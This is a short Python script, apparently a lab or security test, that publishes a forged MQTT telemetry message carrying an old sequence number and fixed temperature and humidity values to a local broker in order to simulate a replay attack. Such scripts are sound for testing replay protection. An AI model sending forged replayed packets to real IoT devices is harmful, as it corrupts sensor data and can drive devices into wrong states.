import paho.mqtt.client as mqtt
import json

client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
client.connect("localhost", 1883)

# Simulamos un paquete capturado previamente con una secuencia baja
replay_packet = {
    "temperature": 22.0,
    "humidity": 45.0,
    "seq": 5,        # Secuencia antigua
    "state": 0       # Cold/Dry
}

print("♻️ Sending Replay Attack...")
client.publish("device_1/telemetry", json.dumps(replay_packet))
client.disconnect()